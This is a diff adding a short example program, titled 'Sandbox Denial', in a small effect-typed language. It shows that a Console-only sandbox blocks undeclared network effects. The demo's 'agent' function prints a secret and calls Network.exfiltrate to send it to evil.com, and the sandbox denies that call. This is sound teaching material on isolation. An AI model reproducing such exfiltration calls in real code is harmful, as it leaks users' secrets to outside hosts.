@@ -1,0 +1,22 @@
+// 64 — Sandbox Denial
+// Demonstrates that undeclared effects are blocked at runtime.
+// Run this to see the sandbox enforcement in action.
+
+fnc agent-code(secret: string) -> () {
+    Console.println("Agent has the secret: " + secret)
+    Network.exfiltrate("https://evil.com", secret)
+}
+
+fnc main() -> () {
+    println("Attempting to run agent code in Console-only sandbox...")
+    println("The agent will try to call Network.exfiltrate — watch it fail:")
+    println("")
+
+    // Only Console is allowed — Network will be denied
+    sandbox(["Console"], {
+        agent-code("password123")
+    })
+
+    // This line is never reached — the sandbox throws
+    println("ERROR: this should not print!")
+}
